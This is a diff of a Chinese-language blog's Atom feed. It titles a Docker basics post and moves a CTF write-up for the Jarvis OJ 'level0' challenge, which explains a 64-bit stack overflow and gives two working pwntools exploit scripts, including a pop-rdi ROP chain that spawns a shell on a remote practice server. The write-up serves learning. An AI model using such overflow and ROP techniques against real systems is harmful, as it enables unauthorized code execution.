@@ -51,11 +51,11 @@
   </entry>
   
   <entry>
-    <title></title>
+    <title>docker基础</title>
     <link href="https://www.zzl14.xyz/2020/02/16/docker%E9%85%8D%E7%BD%AE/"/>
     <id>https://www.zzl14.xyz/2020/02/16/docker%E9%85%8D%E7%BD%AE/</id>
     <published>2020-02-16T06:19:15.000Z</published>
-    <updated>2020-04-06T13:10:08.852Z</updated>
+    <updated>2020-04-06T13:19:12.926Z</updated>
     
     <content type="html"><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure><p>针对简单操作理解一下DOCKER</p><p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure><p>image_name就是指的镜像</p><p>pull就是拉取一个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Docker镜像可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure><h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像docker run --name container-name -d image-name    运行容器--name：自定义容器名-d：表示后台运行docker ps（查看运行中的容器）；    加上-a；可以查看所有容器docker stop container-name/container-id    停止当前运行的指定容器启动    docker start container-name/container-id    启动容器删除    docker rm container-id    删除指定容器端口映射    -p 6379:6379如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    -p:主机端口映射到容器内部的端口 docker中run和start的区别docker run 后面指定的是一个镜像而docker start指定的是一个容器docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p><pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash-t: 在新容器内指定一个伪终端或终端。-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>​<br>停止容器<br>​    docker stop </p><p>exit 命令或者使用 CTRL+D 来退出容器。</p><p>后台启动容器</p><pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash -d 参数时，容器启动后会进入后台 -i: 允许你对容器内的标准输入 (STDIN) 进行交互。     -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p><pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：docker attachdocker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。例如docker attach 4b6771050406docker exec -it b26d4f3e2cac /bin/bash删除容器使用 docker rm 命令：docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images 查看镜像"></a>docker images 查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p><p>面是一段简单的Dockerfile的例子：</p><pre><code>FROM python:2.7MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;COPY . /appWORKDIR /appRUN pip install -r requirements.txtEXPOSE 5000ENTRYPOINT [&quot;python&quot;]CMD [&quot;app.py&quot;]我们可以分析一下上面这个过程：1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像2、显示维护者的信息3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;4、指定工作路径为 /app5、安装依赖包6、暴露 5000 端口7、启动 app这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
     
@@ -305,34 +305,6 @@
   </entry>
   
   <entry>
-    <title>level0</title>
-    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
-    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
-    <published>2019-08-08T07:25:16.000Z</published>
-    <updated>2019-10-30T09:09:59.328Z</updated>
-    
-    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-
-&lt;p&gt;1.首先要用到&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
-&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
-      
-    
-    </summary>
-    
-    
-    
-      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
     <title>drops做题收获</title>
     <link href="https://www.zzl14.xyz/2019/08/08/p/"/>
     <id>https://www.zzl14.xyz/2019/08/08/p/</id>
@@ -352,6 +324,34 @@
 
 &lt;p&gt;攻防世界 &lt;/p&gt;
 &lt;h1 id=&quot;CGfsb&quot;&gt;&lt;a href=&quot;#CGfsb&quot; class=&quot;headerlink&quot; title=&quot;CGfsb&quot;&gt;&lt;/a&gt;CGfsb&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞&lt;br&gt;因为当时做这个题时候不
+      
+    
+    </summary>
+    
+    
+    
+      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>level0</title>
+    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
+    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
+    <published>2019-08-08T07:25:16.000Z</published>
+    <updated>2019-10-30T09:09:59.328Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;p&gt;1.首先要用到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
+&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
       
     
     </summary>
